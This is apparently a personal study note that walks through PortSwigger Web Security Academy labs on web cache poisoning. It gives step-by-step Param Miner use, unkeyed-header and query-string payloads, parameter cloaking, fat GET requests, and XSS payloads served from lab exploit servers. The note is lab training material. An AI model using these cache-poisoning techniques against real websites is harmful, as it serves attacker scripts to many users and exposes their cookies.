# 🎯 Web Cache Poisoning - Complete Guide

---

## 📌 Overview

Web cache poisoning is an attack in which an attacker **poisons the web cache** by using HTTP headers and attacker-controllable servers. The goal is to find which **unkeyed headers** the website will allow.

---

## 🔑 Key Concepts

> **🔐 Keyed Header** → The web cache checks these headers to determine if it should serve a stored response.

> **🔓 Unkeyed Header** → The web cache does NOT check these headers - **this is where vulnerabilities start**.

---

## 🛠️ Tools Required

We have a **Burp extension** that can guess headers for us:

- 🔥 **Param Miner**

---

## 📡 Common Cache Headers

- ✅ `X-CACHE-STATUS`
- ✅ `CF-CACHE-STATUS`
- ✅ `X-SERVE-BY`
- ✅ `X-CACHE`
- ✅ `X-VANISH`

---

## 💥 Attack Techniques

---

### 🎯 1. Web Cache Poisoning with an Unkeyed Header

#### 📝 Steps:

**Step 1:** 🔧 Install **Param Miner**

**Step 2:** 🔄 Reload the page and send `GET /` request to the **Repeater**

**Step 3:** 🖱️ Right click → Extensions → Param miner → **Guess Headers**

**Step 4:** 📂 Go to the **Extension tab** → Click on **Param miner** → **Output**

**Step 5:** 👀 Here you will see the **vulnerable header**

**Step 6:** ✅ Found header: `X-Forwarded-Host`

**Step 7:** 🚀 Go to Repeater and use this header:

```http
X-Forwarded-Host: exploit-0ab600f10354fb1680b002a901730002.exploit-server.net
```

**Step 8:** 📄 In **exploit server** change the `/file` to → `resources/js/tracking.js`  
_(This is the file that contains the functionality of this page)_

**Step 9:** 💻 In **body tag** → `alert(domain.cookie)` → **Store** and hit send button until you see **cache hit** ✅

---

### 🍪 2. Web Cache Poisoning with an Unkeyed Cookie

#### 📝 Steps:

**Step 1:** 🌐 Load the **home page** of website

**Step 2:** 👁️ Found a **weird cookie** named `fehost` - the value of this cookie is stored in a **script tag** in the response

**Step 3:** ⚠️ Everything in script tag will be **executed** (potential vulnerability)

**Step 4:** ✏️ Edit the `fehost` cookie to:

```
prod-cache-01"-alert(1)-"
```

**Breaking it down:**

- `"` → Close the string
- `-alert(1)-` → Our payload 🎯
- `"` → Close the last `"`

**Step 5:** 🧪 Use `GET /?cb=123` just for **testing**

**Step 6:** 💣 Then use the same in `GET /` for **real attack**

---

### 🔗 3. Web Cache Poisoning with Multiple Headers

#### 📝 Steps:

**Step 1:** 🌐 Load the website

**Step 2:** 📄 Found `/resources/js/tracking.js` file

**Step 3:** 📤 Send it to **Repeater**

**Step 4:** 🖱️ Right click → Extensions → Param miner → ⏳ Wait for results

**Step 5:** ✅ Got `X-Forwarded-Scheme` is **allowed**

**Step 6:** 🎲 Use this header with a **random string**:

```http
X-Forwarded-Scheme: djfhak
```

**Step 7:** ➕ Also use `X-Forwarded-Host`:

```http
X-Forwarded-Host: exploit-0af9002504f450948093d92a01cf008a.exploit-server.net
```

**Step 8:** ⚙️ **Changes in exploit server:**

- 📁 File: `/resources/js/tracking.js`
- 💻 Body: `alert(document.cookie)`

**Step 9:** 🔄 Send the request until **web cache is refreshed** ✅

---

### 🎯 4. Targeted Web Cache Poisoning Using an Unknown Header

#### 📝 Steps:

**Step 1:** 🔍 Web cache has an additional header named `User-Agent` - if victim comes with a **different browser**, the response will change

**Step 2:** 🛠️ Use **Param Miner** to find the HTTP header

**Step 3:** ✅ Param Miner returns `X-Host` HTTP header is allowed (used below the Host header)

---

### 🔗 5. Web Cache Poisoning via an Unkeyed Query String

#### 📝 Steps:

**Step 1:** 📤 Send the `GET /` request to the **Repeater**

**Step 2:** 🔗 Use parameter `GET /?abc=123`

**Step 3:** 👁️ In response, notice:

```html
<link rel="canonical" href='//0a01006904cce1b78054034700b80038.web-security-academy.net/?abc=123'/>
```

**Step 4:** 🧪 Create payload **step by step**:

- `GET /?abc=123'hello`
- `GET /?abc=123'/>hello` → To **close the tag** (notice `home/>` displayed in corner)
- `GET /?abc=123'/><script>alert(1)</script>` → **Final payload** 🎯✅

---

### 📊 6. Web Cache Poisoning via an Unkeyed Query Parameter

#### 📝 Steps:

**Step 1:** 📤 Send the `GET /` request to the browser

**Step 2:** 🖱️ Right click → Extensions → Param miner → **Unkeyed parameter** → Found `utm_content` ✅

**Step 3:** 💣 Use this payload:

```
/?utm_content='/><script>alert(1)</script>
```

**Step 4:** 🎯 UTM parameters are **ignored by web cache**, so this will infect the **home directory**

---

#### 📌 Important Notes: UTM Parameters

> 📈 **UTM parameters** are used by organizations to track their **advertisements** - to see which source brings users/visitors (e.g., which website).

**🏢 Example Scenario:** An institute advertising courses on a website can track which website brings the most users/visitors when they click the advertisement.

**📊 Common UTM Parameters:**

- 🌐 `utm_source` → Source of traffic
- 📱 `utm_medium` → Medium of traffic
- 🎯 `utm_campaign` → Campaign name
- 🔍 `utm_term` → Search term used (e.g., institute searched by this word)
- 🖱️ `utm_content` → What specifically was clicked (e.g., banner or link)

> ⚠️ **Note:** UTM parameters are **unkeyed** for web cache, so the web cache only reads the request up to the UTM parameter.

**📝 Example:**

```
GET /?abc=123&file=test&utm_content
```

The website will only read: `GET /?abc=123&file=test`

---

### 🎭 7. Parameter Cloaking

**💡 Concept:** Inconsistent parameter parsing between the **cache** and the **back-end** - the cache excludes some parameters but the backend verifies the request using them.

> 🔑 **Note:** Cache key parameter = parameters included by cache

---

#### 🔍 Understanding with Examples

**🎬 Scenario First:**

**Step 1:** 🌐 Request: `https://www.example.local/?param1=123&param2=456`

**Step 2:** 🔑 Cache key parameter is only `param1`, `param2` is **excluded**

---

**🎬 Scenario Second:**

**Step 1:** 🌐 Request: `https://www.example.local/?param1=123?param2=456`

**Step 2:** 💭 Cache understands these as **2 parameters**

**Step 3:** 🎯 Backend server serves it as `param1` with value `123?param2=456`

---

#### 💎 Ruby on Rails Concept

**Point 1:** 💻 Ruby on Rails uses **two symbols**: `&` and `;` to separate parameters

**Point 2:** ⚠️ Cache **doesn't understand** Ruby on Rails concept, but **web application does**

**Point 3:** 🌐 Request: `https://www.example.local/?param1=123&param2=456;param3=789`

**🗄️ Cache Perspective:**

- Only **TWO** parameters:
    - `param1=123`
    - `param2=456;param3=789` _(doesn't understand `;` as separator)_

**🖥️ Web Application Perspective:**

- **THREE** parameters:
    - `param1=123`
    - `param2=456`
    - `param3=789`

---

#### 🔥 Vulnerability Exploitation

**Step 1:** 🌐 Request: `https://www.example.local/?param1=123&param2=456;param1=malicious payload`

**Step 2:** 🗄️ For cache: only `param1` is cache key parameter, **ignore afterwards**

**Step 3:** ⚡ When it reaches backend: `param1=123` is **replaced** by `param1=malicious payload`

**Step 4:** 🎯 For web application: `https://www.example.local/?param2=456;param1=malicious payload`

---

#### ✅ Solving the Lab

**Step 1:** 📤 Send request: `GET /js/geolocate.js?callback=setCountryCookie`

**Step 2:** 🎮 Play with parameters

**Step 3:** ✏️ Try to edit `callback` → `callback1` → ❌ Invalid (means it's a **cache key parameter**)

**Step 4:** 👀 Notice that we can change the **value** of callback parameter and it's **reflected** in response

**Step 5:** 💣 Add parameters like `utm_content` and `callback` again with **malicious payload**:

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=11111;callback=alert(1)
```

**Step 6:** 🎉 **Lab solved** ✅

---

### 📦 8. Web Cache Poisoning via a Fat GET Request

#### 📝 Steps:

**Step 1:** 📄 Found request: `GET /js/geolocate.js?callback=setCountryCookie`

**Step 2:** 🖱️ Right click and send to **Param Miner** with **Fat GET finder**

**Step 3:** ✅ Found that `X-Http-Method-Override: POST` method is **allowed**

**Step 4:** 🔄 This **overwrites** the request as a **POST request** _(useful because we couldn't poison the parameter like previous methods)_

**Step 5:** 📝 Like POST requests, parameters go in the **body**:

```http
X-Http-Method-Override: POST

callback=alert(1)
```

**Step 6:** 🔄 Reload the home page and **it works** ✅

---

### 🔗 9. URL Normalization

#### 📝 Steps:

**Step 1:** 📤 Take `GET /` request to the **Repeater**

**Step 2:** 🔗 Pass anything after `/`:

```
GET /jdhfisk
```

**Step 3:** 👁️ In response, this reflects in `<p></p>` **paragraph tag**

**Step 4:** 🎯 Take script **outside** this tag using payload:

```html
</p><script>alert(1)</script><p>
```

**Step 5:** 🚀 Deliver to **victim** ✅

---

### 🎯 10. Web Cache Poisoning to Exploit a DOM Vulnerability (Strict Cacheability)

---

#### 1️⃣ Intercept Normal Traffic

- 🚀 Started **Burp Suite**
- 🌐 Opened **home page** of website
- 🔍 Went to **Proxy** → **HTTP history**
- 📄 Found **GET request** for `/`
- 📤 Sent to **Repeater**

---

#### 2️⃣ Found a Useful Header (Param Miner)

- 🛠️ Used **Param Miner**
- ✅ Discovered `X-Forwarded-Host` header is **supported**
- 🎯 This header affects **backend logic**

> 💡 **Important:** `X-Forwarded-Host` controls the `data.host` variable

---

#### 3️⃣ Why This Matters

The website uses `data.host` inside:

- 📄 `/resources/js/geolocate.js`
- ⚙️ Inside the `initGeoLocate()` function
- 📝 JSON response is **directly written to the DOM**
- ❌ **No proper sanitization** → **DOM XSS** 🔥

> 🎯 **If we control the JSON → we control the JavaScript output**

---

#### 4️⃣ Prepare the Exploit Server

**Step 1:** 🌐 Opened **Exploit Server**

**Step 2:** 📁 Changed file path to: `/resources/json/geolocate.json`

**Step 3:** 🔧 Added header (for CORS):

```
Access-Control-Allow-Origin: *
```

**Step 4:** 💣 Added **malicious JSON body**:

```json
{
  "country": "<img src=1 onerror=alert(document.cookie) />"
}
```

**Step 5:** 💾 **Stored** the exploit

---

#### 5️⃣ Poison the Cache

**Step 1:** 📤 Sent home page request to **Repeater**

**Step 2:** ➕ Added header:

```http
X-Forwarded-Host: YOUR-EXPLOIT-ID.exploit-server.net
```

**Step 3:** 🎲 Added **cache buster** (random query parameter):

```
/?cb=12345
```

**Step 4:** 🔄 Sent request **multiple times**

---

#### 6️⃣ Cache Problem (Set-Cookie Issue)

**❌ Problem:** Sometimes it didn't cache

**🔍 Reason:** Response had `Set-Cookie` - responses with cookies are **not cacheable**

**✅ Fix:**

- 🔄 Reloaded home page in browser (cookie already set)
- 📤 Sent new request to Repeater
- 🔁 Repeated poisoning steps

---

#### 7️⃣ Confirm Cache Poisoning

**🎯 Success signs:**

- ✅ Response contains: `X-Cache: hit`
- ✅ Exploit server URL appears in response

**This means:**

- ✅ Cache is **poisoned** 🔥
- ✅ Victims will get **attacker-controlled JSON**

---

#### 8️⃣ Simulate Victim

**Step 1:** 🌐 Opened home page normally in browser

**Step 2:** 📥 Page loads **poisoned JSON**

**Step 3:** 💥 XSS payload **executes**

**Step 4:** ✅ `alert(document.cookie)` pops up

🎉 **Lab solved** ✅✅✅

---

### 🔗 11. Combining Web Cache Poisoning Vulnerabilities

#### 📝 Steps:

**Step 1:** 📤 Send `GET /` request to **Repeater**

**Step 2:** 👁️ Notice request `/resources/json/translations.json` - copy this to **exploit**

**Step 3:** 🔧 Add `Access-Control-Allow-Origin: *` in body

**Step 4:** 💣 Add this payload in **exploit server**:

```json
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "</a><img src=1 onerror='alert(document.cookie)' />",
            "Description:": "Descripción"
        }
    }
}
```

**Step 5:** 🌐 Try to change **language** in home page - get **2 requests**:

- 📄 `GET /setlang/es`
- 🔗 `GET /?localized=1` → Redirected by 1st request

**Step 6:** 🛠️ From **Param Miner**, found **two headers**:

- ✅ `X-Forwarded-Host`
- ✅ `X-Original-Url`

**Step 7:** 🧪 In `GET /` request, use `X-Forwarded-Host` to check if it works:

```http
X-Forwarded-Host: example.com
```

**Step 8:** ✅ It works! Replace with **exploit server** and start getting **alerts** 🚨

**Step 9:** ⚠️ **Problem:** By default home page is in **English**, exploit works in `es`

**Step 10:** 💡 **Solution:** Need to redirect home page to `es`

---

**📄 Request One** _(redirect to es language)_:

```http
GET / HTTP/2
Host: 0ac6009503d5940e83b7c89f00f2003e.web-security-academy.net
X-Original-Url: /setlang\es?
```

**📄 Request Two** _(invoke payload in exploit server)_:

```http
GET /?localized=1 HTTP/2
Host: 0ac6009503d5940e83b7c89f00f2003e.web-security-academy.net
X-Forwarded-Host: exploit-0a790067033f944d83d8c74a018e00c9.exploit-server.net
```

**Step 11:** ⚠️ **Important:** First send the **2nd request**, then **1st** → 🎉 **Lab solved** ✅

---

### 🔒 12. Internal Cache Poisoning

#### 📝 Steps:

**Step 1:** 🔍 After analyzing requests, see there are **no cache headers** - may be an **internal cache header**

**Step 2:** 🛠️ Start **Param Miner** and **guess headers**

**Step 3:** ✅ In output, found `X-Forwarded-Host`

**Step 4:** ➕ Add **exploit server** with it

**Step 5:** 📁 In exploit server, change path to `js/geolocate.js` and add payload `alert(document.cookie)`

**Step 6:** 💾 **Store** and send the request **again and again**

**Step 7:** ⏳ **Note:** Can't see cache header, so **wait** - lab will be solved 🎉

---

## 🏷️ Tags

#web-security #cache-poisoning #burp-suite #xss #http-headers #param-miner #exploitation #security-testing #penetration-testing #web-vulnerabilities

---

## 🔗 Related Topics

- [[XSS Attacks]]
- [[HTTP Headers]]
- [[Burp Suite]]
- [[Web Application Security]]
- [[Cache Mechanisms]]
- [[DOM-based Vulnerabilities]]
- [[Parameter Pollution]]

---

## 📚 Resources

- 🌐 PortSwigger Web Security Academy
- 🔥 Burp Suite Extensions
- 📖 OWASP Web Security Testing Guide

---
